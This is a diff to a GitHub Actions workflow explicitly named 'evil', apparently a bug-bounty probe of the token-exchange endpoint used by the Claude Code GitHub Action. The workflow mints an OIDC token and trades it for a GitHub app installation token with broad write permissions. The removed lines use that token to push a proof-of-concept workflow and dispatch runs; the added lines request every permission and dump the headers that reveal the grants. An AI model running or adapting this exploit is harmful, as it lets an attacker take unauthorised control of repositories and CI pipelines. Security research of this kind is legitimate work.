@@ -1,4 +1,4 @@
-name: evil-reusable-proveperm
+name: evil-introspect
 
 on:
   workflow_call:
@@ -11,52 +11,27 @@ jobs:
   exchange:
     runs-on: ubuntu-latest
     steps:
-      - name: Mint install token + USE its workflows:write capability
+      - name: Introspect install token's actual permission grants
         run: |
           set +e
           AUD="claude-code-github-action"
           URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}"
           TOK=$(curl -sk -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$URL" | jq -r .value)
           echo "::add-mask::$TOK"
-
+          # Mint install token with ALL permissions requested; GitHub will cap to actual grant.
           curl -sk -o /tmp/r.json -w 'EXCHANGE_HTTP %{http_code}\n' \
             -X POST "https://api.anthropic.com/api/github/github-app-token-exchange" \
             -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -H "X-HackerOne-Handle: liamconner10" \
-            -d '{"permissions":{"contents":"write","workflows":"write","actions":"write"}}'
+            -d '{"permissions":{"contents":"write","workflows":"write","actions":"write","pull_requests":"write","issues":"write","metadata":"read","checks":"write","statuses":"write","discussions":"write"}}'
           INSTALL=$(jq -r '.token // empty' /tmp/r.json)
-          if [ -z "$INSTALL" ]; then
-            echo "NO_INSTALL_TOKEN"; jq . /tmp/r.json; exit 0
-          fi
           echo "::add-mask::$INSTALL"
-          echo "INSTALL_TOKEN_OK expires=$(jq -r .expires_at /tmp/r.json)"
+          jq -c 'if .token then {token:"<MASKED>", expires_at} else . end' /tmp/r.json
 
-          echo "--- TEST 1: list installation repos"
-          curl -sk -H "Authorization: Bearer $INSTALL" -H "Accept: application/vnd.github+json" \
-            "https://api.github.com/installation/repositories?per_page=5" -w '\nT1_HTTP %{http_code}\n' \
-            | jq -c '{repo:.repositories[0].full_name}'
+          # Many endpoints expose the installation's effective permission set
+          echo "--- /installation/repositories headers"
+          curl -sk -D - -H "Authorization: Bearer $INSTALL" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/installation/repositories?per_page=1" -o /dev/null | grep -iE "x-accepted|x-github-permissions|x-oauth-scopes|x-ratelimit|x-github-media|x-github-request|x-github-api-version"
 
-          echo "--- TEST 2: actions:read — list workflow runs"
-          curl -sk -H "Authorization: Bearer $INSTALL" -H "Accept: application/vnd.github+json" \
-            "https://api.github.com/repos/LiamConner10/oidc-anthropic-probe/actions/runs?per_page=1" -w '\nT2_HTTP %{http_code}\n' \
-            | jq -c '{total_count, latest_run_id: .workflow_runs[0].id}'
-
-          echo "--- TEST 3: workflows:write — push new workflow file"
-          POC_NAME="POC_install_${GITHUB_RUN_ID}.yml"
-          printf 'name: poc-test\non: workflow_dispatch\njobs:\n  noop:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "install token wrote me"\n' > /tmp/poc_content.yml
-          POC_B64=$(base64 -w0 < /tmp/poc_content.yml)
-          MAIN_SHA=$(curl -sk -H "Authorization: Bearer $INSTALL" "https://api.github.com/repos/LiamConner10/oidc-anthropic-probe/git/ref/heads/main" | jq -r .object.sha)
-          curl -sk -H "Authorization: Bearer $INSTALL" -H "Accept: application/vnd.github+json" \
-            -X POST "https://api.github.com/repos/LiamConner10/oidc-anthropic-probe/git/refs" \
-            -d "{\"ref\":\"refs/heads/perm-poc\",\"sha\":\"$MAIN_SHA\"}" -w '\nBRANCH_HTTP %{http_code}\n' | jq -c '{ok:.ref, err:.message}'
-          curl -sk -H "Authorization: Bearer $INSTALL" -H "Accept: application/vnd.github+json" \
-            -X PUT "https://api.github.com/repos/LiamConner10/oidc-anthropic-probe/contents/.github/workflows/$POC_NAME" \
-            -d "{\"message\":\"PoC install token workflows:write\",\"content\":\"$POC_B64\",\"branch\":\"perm-poc\"}" \
-            -w '\nT3_HTTP %{http_code}\n' | jq -c '{file:.content.html_url, msg:.message, errors:.errors}'
-
-          echo "--- TEST 4: actions:write — dispatch a workflow"
-          curl -sk -H "Authorization: Bearer $INSTALL" -H "Accept: application/vnd.github+json" \
-            -X POST "https://api.github.com/repos/LiamConner10/oidc-anthropic-probe/actions/workflows/probe.yml/dispatches" \
-            -d '{"ref":"main","inputs":{"audience":"claude-code-github-action","permissions_json":"{\"contents\":\"read\"}"}}' \
-            -w '\nT4_HTTP %{http_code}\n'
-
-          echo "DONE"
+          # Try the user app installations (won't work but informative)
+          echo "--- attempt /user/installations (will 403 without user-auth)"
+          curl -sk -H "Authorization: Bearer $INSTALL" "https://api.github.com/user/installations" -w '\nHTTP %{http_code}\n' | head -3
